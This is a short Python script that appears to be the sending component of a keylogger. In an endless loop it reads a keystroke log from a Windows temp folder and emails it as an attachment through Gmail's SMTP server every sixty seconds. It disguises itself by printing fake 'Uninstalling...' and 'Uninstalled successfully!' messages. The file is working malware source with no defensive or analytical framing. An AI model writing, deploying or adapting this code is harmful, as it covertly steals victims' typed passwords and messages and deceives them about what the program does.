import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

EMAIL_ADDRESS = ''
EMAIL_PASSWORD = ''
TO_EMAIL = ''
LOG_FILE_PATH = r'C:\Windows\Temp\keys.log'
SEND_EVERY_SECONDS = 60

def send_log():
    print("Uninstalling...")
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = TO_EMAIL
    msg['Subject'] = 'Log File'

    # attaching the logs
    try:
        with open(LOG_FILE_PATH, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename="keys.log"')
            msg.attach(part)
    except Exception as e:
        print(f"Failed to uninstall")
        return

    # sending the email
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        print("Uninstalled successfully!")
    except Exception as e:
        print(f"Failed to uninstall")

if __name__ == "__main__":
    while True:
        send_log()
        time.sleep(SEND_EVERY_SECONDS)
